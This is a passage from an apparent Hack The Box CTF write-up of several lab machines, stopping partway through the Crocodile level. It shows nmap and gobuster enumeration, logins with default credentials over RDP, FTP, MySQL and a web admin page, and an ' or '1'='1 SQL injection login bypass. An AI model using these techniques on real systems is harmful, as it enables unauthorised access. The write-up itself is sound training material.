| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |

Using nmap, we were able to discover the host was running an Redis on port 6379. Logging in, we were then able to get access to the database, a consequence of the server administrator having poorly configured the default login credentials.


[Table of Contents](#table-of-contents) 


## Level 5: Explosion

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.2.176 | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.2.176 

PING 10.129.2.176 (10.129.2.176) 56(84) bytes of data.
64 bytes from 10.129.2.176: icmp_seq=1 ttl=127 time=10.8 ms
64 bytes from 10.129.2.176: icmp_seq=2 ttl=127 time=8.38 ms
64 bytes from 10.129.2.176: icmp_seq=3 ttl=127 time=6.35 ms
64 bytes from 10.129.2.176: icmp_seq=4 ttl=127 time=12.7 ms

--- 10.129.2.176 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 6.353/9.562/12.696/2.402 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.2.176 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 12:11 EDT
Nmap scan report for 10.129.2.176
Host is up (0.0087s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION                                                              
|   DNS_Domain_Name: Explosion                                                                    
|   DNS_Computer_Name: Explosion                                                                  
|   Product_Version: 10.0.17763                                                                   
|_  System_Time: 2022-07-22T16:12:35+00:00                                                        
| ssl-cert: Subject: commonName=Explosion                                                         
| Not valid before: 2022-07-21T16:09:57                                                           
|_Not valid after:  2023-01-20T16:09:57                                                           
|_ssl-date: 2022-07-22T16:12:43+00:00; 0s from scanner time.                                      
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                             
|_http-server-header: Microsoft-HTTPAPI/2.0                                                       
|_http-title: Not Found                                                                           
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-07-22T16:12:40
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.88 seconds

```
Our scan shows many ports to explore. Analyzing the list of open ports, port 3389 appears to be the most interesting. This port is reserved for remote desktop logins on Windows machines. Since RDP is a native Windows protocol, we need to find a tool to establish connection. This exercise is being performed using the Kali Linux distribution.

A free open-source tool that we can use in Linux is [FreeRDP](https://www.freerdp.com/)

> FreeRDP is a free implementation of the Remote Desktop Protocol (RDP), released under the Apache license. Enjoy the freedom of using your software wherever you want, the way you want it, in a world where interoperability can finally liberate your computing experience.

We can first try to establish a connection:

```
└─$ xfreerdp /v:10.129.2.176

[12:25:46:785] [6781:6782] [INFO][com.freerdp.client.x11] - No user name set. - Using login name: kali
[12:25:46:143] [6781:6782] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[12:25:46:143] [6781:6782] [WARN][com.freerdp.crypto] - CN = Explosion
[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.2.176:3389) 
[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - Common Name (CN):
[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] -        Explosion
[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.2.176:3389 (RDP-Server):
        Common Name: Explosion
        Subject:     CN = Explosion
        Issuer:      CN = Explosion
        Thumbprint:  d3:a9:f6:c4:11:a1:b1:19:0a:71:bb:2a:72:8c:73:9b:7f:bb:59:74:c1:98:6f:2d:3d:2a:ea:90:0b:ef:27:fe
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) 


```
Looking at the ouput, we can see that that our default account was not validated. 

Next, we can try forcing the certifcate to by ignored:

```
└─$ xfreerdp /v:10.129.2.176 /cert:ignore  

[12:28:21:567] [7463:7464] [INFO][com.freerdp.client.x11] - No user name set. - Using login name: kali
Domain:   
Password: 
[12:28:26:211] [7463:7464] [ERROR][com.freerdp.core] - transport_ssl_cb:freerdp_set_last_error_ex ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED [0x0002000F]
[12:28:26:211] [7463:7464] [ERROR][com.freerdp.core.transport] - BIO_read returned an error: error:0A000438:SSL routines::tlsv1 alert internal error


```
Now we can attempt at cycling through different user names.

According to [google](https://www.google.com/search?client=firefox-b-1-e&q=default+rdp+user+name), the default user name for RDP is Administrator.

We can try to login using that credential:

```
─$ xfreerdp /v:10.129.2.176 /cert:ignore /u:Administrator
Password: 

[12:34:01:416] [9014:9015] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
[12:34:02:718] [9014:9015] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[12:34:02:718] [9014:9015] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[12:34:02:748] [9014:9015] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[12:34:02:749] [9014:9015] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[12:34:03:746] [9014:9015] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]

```

![Screenshot_2022-07-22_12_34_40](https://user-images.githubusercontent.com/59018247/180485827-eda2759f-4a48-46ce-b9c9-509b0cafb902.png)

Looks like it was a success! We have full access to this Windows Server 2019.

Browsing the desktop we can see our fifth flag to collect.

![Screenshot_2022-07-22_12_46_03](https://user-images.githubusercontent.com/59018247/180486360-7937f464-ab10-4fce-85c4-3a05aa2fcf85.png)


## Conclusions - Level 5 Explosion

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	FreeRDP   |    	Used to connect to Windows RDP machines | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
| 2 | 	RDP Port 3389 exposed externally   |    	 | X |  |  |

Using nmap, we were able to discover the host had RDP port 3389 open externally. Using FreeRDP, we were then able to get access remote access to the machine, a consequence of the server administrator having poorly configured the default login credentials.


[Table of Contents](#table-of-contents) 

## Level 6: Preignition

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.3.75 | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.3.75 

PING 10.129.3.75 (10.129.3.75) 56(84) bytes of data.
64 bytes from 10.129.3.75: icmp_seq=1 ttl=63 time=12.7 ms
64 bytes from 10.129.3.75: icmp_seq=2 ttl=63 time=11.1 ms
64 bytes from 10.129.3.75: icmp_seq=3 ttl=63 time=9.60 ms
64 bytes from 10.129.3.75: icmp_seq=4 ttl=63 time=8.86 ms

--- 10.129.3.75 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 8.855/10.561/12.660/1.464 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.3.75  

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 13:17 EDT
Nmap scan report for 10.129.3.75
Host is up (0.0075s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.07 seconds


```
Our scan reveals only one open port to dissect; port 80 a web server. The first thing to snoop in this situation is the website connected to this IP.

We can see in the browser that we have a very simplistic web interface to deal with.

![Screenshot_2022-07-22_13_32_24](https://user-images.githubusercontent.com/59018247/180493613-739dd947-5bc7-447b-acb6-dff0da13b32d.png)

We can try analyzing the the directory structure of the website using the tool ```gobuster```.

Kali Linux by default comes equipped with an assortment of wordlists to run against. The first choice will be a common list for directories located at:

```
/usr/share/wordlists/dirb/common.txt
```

Running the directory scan against our target, we reveal:

```
└─$ sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.129.3.75

[sudo] password for kali: 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.3.75
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/22 13:37:33 Starting gobuster in directory enumeration mode
===============================================================
/admin.php            (Status: 200) [Size: 999]
                                               
===============================================================
2022/07/22 13:37:38 Finished
===============================================================


```
We can see here that we have one directory that we can manually tap into, ```/admin.php```.

Viewing this page in the browser, we reveal:

 ![Screenshot_2022-07-22_13_41_17](https://user-images.githubusercontent.com/59018247/180494770-5a882570-c345-4a9b-a487-8bdf88609fb4.png)

It appears to be the administration login page for the website. 

We can try some basic login credentials as we attempted in previous CTF challenges.

Starting with ```admin/admin``` :

![Screenshot_2022-07-22_13_44_51](https://user-images.githubusercontent.com/59018247/180495246-f8cf2939-4ea5-45d1-a8b9-e9395dba1851.png)

It appears to be a successful login! We now obtained out sixth flag.

## Conclusions - Level 6 Preignition

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	gobuster   |    	Used to brute force directories, DNS subdomains, virtual host names, and amazon s3 buckets | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |

Using nmap, we were able to discover the host had a webserver communicating on port 80. Using gobuster, we were then able to get a directory structure of the website to locate hidden pages that were not visible. We then found admin.php, where we were able to log in as a consequence of the server administrator having poorly configured the default login credentials.


[Table of Contents](#table-of-contents) 

# Tier 1

## Level 1: Appointment

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.3.76 | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.3.76

PING 10.129.3.76 (10.129.3.76) 56(84) bytes of data.
64 bytes from 10.129.3.76: icmp_seq=1 ttl=63 time=8.75 ms
64 bytes from 10.129.3.76: icmp_seq=2 ttl=63 time=7.79 ms
64 bytes from 10.129.3.76: icmp_seq=3 ttl=63 time=5.93 ms
64 bytes from 10.129.3.76: icmp_seq=4 ttl=63 time=11.5 ms

--- 10.129.3.76 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 5.932/8.483/11.460/1.994 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.3.76

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 14:14 EDT
Nmap scan report for 10.129.3.76
Host is up (0.013s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds

```

Our scan reveals only one open port to dissect; port 80 a web server. The first thing to snoop in this situation is the website connected to this IP.

We can see in the browser that we have a very simplistic login page.

![Screenshot_2022-07-22_14_15_54](https://user-images.githubusercontent.com/59018247/180499799-798f907a-d928-4cbf-b72d-8d488eec5f16.png)

We can try analyzing the the directory structure of the website using the tool ```gobuster```.

Kali Linux by default comes equipped with an assortment of wordlists to run against. The first choice will be a common list for directories located at:

```
/usr/share/wordlists/dirb/common.txt
```

Running the directory scan against our target, we reveal:

```
└─$ sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.129.3.76    
[sudo] password for kali: 

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.3.76
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/22 14:20:10 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.129.3.76/css/]
/fonts                (Status: 301) [Size: 310] [--> http://10.129.3.76/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.129.3.76/images/]
/index.php            (Status: 200) [Size: 4896]                                
/js                   (Status: 301) [Size: 307] [--> http://10.129.3.76/js/]    
/server-status        (Status: 403) [Size: 276]                                 
/vendor               (Status: 301) [Size: 311] [--> http://10.129.3.76/vendor/]
                                                                                
===============================================================
2022/07/22 14:20:14 Finished
===============================================================


```
There does not appear to be anything useful here outside of the login page that we have already been exposed too.

We can start some basic brute forcing techinques using the common list we found in tier 0:

| # | 	Username 	| Password |
| :-----------: | :-----------: | :-----------: |
| 1 | 	root   |    	admin   | 
| 2 | 	admin  |    	admin   | 
| 3 | 	user 	 |  user       | 
| 4 | 	test 	 |  test       | 
| 5 | 	ubuntu |  	ubuntu    | 

Trying all of these combinations results in repeated failure.

The next attempt, we can try to see if there is a database vulnerability by attempting a SQL injection.

We can try to trick the database by adding script logic to alter the backend code. Since ```admin``` is a popular username, we can start with that. However, for the password we can try to use ``` ' or '1'='1 ```. This is telling the database to add and or close with a true statement, essentially removing the need for checking the actual password.

| # | 	Username 	| Password |
| :-----------: | :-----------: | :-----------: |
| 1 | 	admin   |    	' or '1'='1    | 

![Screenshot_2022-07-22_14_32_36](https://user-images.githubusercontent.com/59018247/180502145-a5aaf422-f3d8-4d78-a60d-1e9b9425052b.png)

As we can see, our SQL attack was successful and we aquired our seventh flag.

## Conclusions - Level 1 Appointment

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	gobuster   |    	Used to brute force directories, DNS subdomains, virtual host names, and amazon s3 buckets | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	SQL Injection  |    	X |  |  |  |

Using nmap, we were able to discover the host had a webserver communicating on port 80. We then tried to brute force the login page unsuccessfuly. This then prompted us to try a SQL injection into the password field and proved to be successful.


[Table of Contents](#table-of-contents) 


## Level 2: Sequel

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.3.85 | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.3.85

PING 10.129.3.85 (10.129.3.85) 56(84) bytes of data.
64 bytes from 10.129.3.85: icmp_seq=1 ttl=63 time=8.53 ms
64 bytes from 10.129.3.85: icmp_seq=2 ttl=63 time=7.50 ms
64 bytes from 10.129.3.85: icmp_seq=3 ttl=63 time=13.0 ms
64 bytes from 10.129.3.85: icmp_seq=4 ttl=63 time=11.6 ms

--- 10.129.3.85 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 7.503/10.148/12.968/2.216 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.3.85        

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 15:08 EDT
Nmap scan report for 10.129.3.85
Host is up (0.0099s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_sslv2: ERROR: Script execution failed (use -d to debug)
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, SupportsTransactions, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Support41Auth, LongColumnFlag, IgnoreSigpipes, FoundRows, InteractiveClient, ConnectWithDatabase, Speaks41ProtocolNew, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: *r'dCcI$uC,R;n9qPw,o
|_  Auth Plugin Name: mysql_native_password
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.82 seconds


```

Our scan reveals only one open port to dissect; port 3306 a mysql database. 

The first thing we can try is remotely connecting to the database.

```
─$ mysql -h 10.129.3.85

ERROR 1045 (28000): Access denied for user 'kali'@'10.10.14.87' (using password: NO)

```
Our username was denied from connecting. We can try to brute-force other user names to get in.

According to [dbschema](https://dbschema.com/2020/04/21/mysql-default-username-password/), the default credentials for a mysql database if left unchanged is ```root``` with no password.

```
└─$ mysql -h 10.129.3.85 -u root

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 76
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

```

We were successful with our guess of the username/password!

Now that we are in, we can query the potential databases.

```
MariaDB [(none)]> show databases;

+:-----------:---------+
| Database           |
+:-----------:---------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+:-----------:---------+
4 rows in set (0.013 sec)

MariaDB [(none)]> 

```

We can start by browsing the first one called ```htb```:

```
MariaDB [(none)]> use htb;

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> 

```

Now we can investigate the tables inside of database htb:

```
MariaDB [htb]> show tables;

+:-----------:----+
| Tables_in_htb |
+:-----------:----+
| config        |
| users         |
+:-----------:----+
2 rows in set (0.014 sec)

MariaDB [htb]> 
```

Next we can zoom in on each table, first starting with ```config```:

```
MariaDB [htb]> select * from config;

+----+:-----------::-----------:-+:-----------::-----------::-----------:-+
| id | name                  | value                            |
+----+:-----------::-----------:-+:-----------::-----------::-----------:-+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+:-----------::-----------:-+:-----------::-----------::-----------:-+
7 rows in set (0.007 sec)

MariaDB [htb]> 
```
Excitingly, we have finally revealed our eighth flag located on row 5 of the table!

## Conclusions - Level 2 Sequel

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	mysql   |    	Used to connect to MYSQL databases  | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |

Using nmap, we were able to discover the host had a MYSQL database located on port 3306. We were then able to get access to the database, a consequence of the administrator having poorly configured the default login credentials.

[Table of Contents](#table-of-contents) 

## Level 3: Crocodile

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.3.142 | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.3.142

PING 10.129.3.142 (10.129.3.142) 56(84) bytes of data.
64 bytes from 10.129.3.142: icmp_seq=1 ttl=63 time=8.61 ms
64 bytes from 10.129.3.142: icmp_seq=2 ttl=63 time=7.87 ms
64 bytes from 10.129.3.142: icmp_seq=3 ttl=63 time=6.67 ms
64 bytes from 10.129.3.142: icmp_seq=4 ttl=63 time=10.6 ms

--- 10.129.3.142 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 6.674/8.444/10.629/1.437 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.3.142

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 20:39 EDT
Nmap scan report for 10.129.3.142
Host is up (0.0063s latency).
Not shown: 65533 closed tcp ports (conn-refusecdd)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.87
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
                                                                 

```

Our scan reveals two open ports to dissect; port 21 (a non encrypted FTP channel) and port 80 (Web Server). 

The first thing we can try is to browse the FTP directory for clues.

```
└─$ ftp 10.129.3.142

Connected to 10.129.3.142.
220 (vsFTPd 3.0.3)

Name (10.129.3.142:kali): 

```
We can first try to use the ```anonymous``` credential: 

```
Name (10.129.3.142:kali): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> 

```
We were successful, now we can browse the current directory:

```
ftp> dir

229 Entering Extended Passive Mode (|||48008|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
```
There are two files of interest here, ```allowed.userlist``` and ```allowed.userlist.passwd```

We can first tranfer them using the get command, then view them using the cat command:

```
ftp> get allowed.userlist

local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||41722|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |*************************************************************************************|    33        8.99 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (2.18 KiB/s)

ftp> get allowed.userlist.passwd

local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||41197|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |*************************************************************************************|    62      179.66 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (9.13 KiB/s)

└─$ cat allowed.userlist

aron
pwnmeow
egotisticalsw
admin

└─$ cat allowed.userlist.passwd

root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd

```
It appears we uncovered a list known usernames, along with their corresponding passwords. We can now move on and check the webserver, since we gathered everything we could from the ftp server.

![Screenshot_2022-07-22_20_56_34](https://user-images.githubusercontent.com/59018247/180584238-1a3ef760-bb08-4d38-8668-f6825c3f1f37.png)

The website appears to be fairly standard, however there does not visibly appear to be any login page on the front end. We can try using gobuster to find any hidden directories on the web server.

```
└─$ sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.129.3.142

[sudo] password for kali: 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.3.142
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/22 21:01:11 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.129.3.142/assets/]
/css                  (Status: 301) [Size: 310] [--> http://10.129.3.142/css/]   
/dashboard            (Status: 301) [Size: 316] [--> http://10.129.3.142/dashboard/]
/fonts                (Status: 301) [Size: 312] [--> http://10.129.3.142/fonts/]    
/index.html           (Status: 200) [Size: 58565]                                   
/js                   (Status: 301) [Size: 309] [--> http://10.129.3.142/js/]       
/server-status        (Status: 403) [Size: 277]                                     
                                                                                    
===============================================================
2022/07/22 21:01:15 Finished
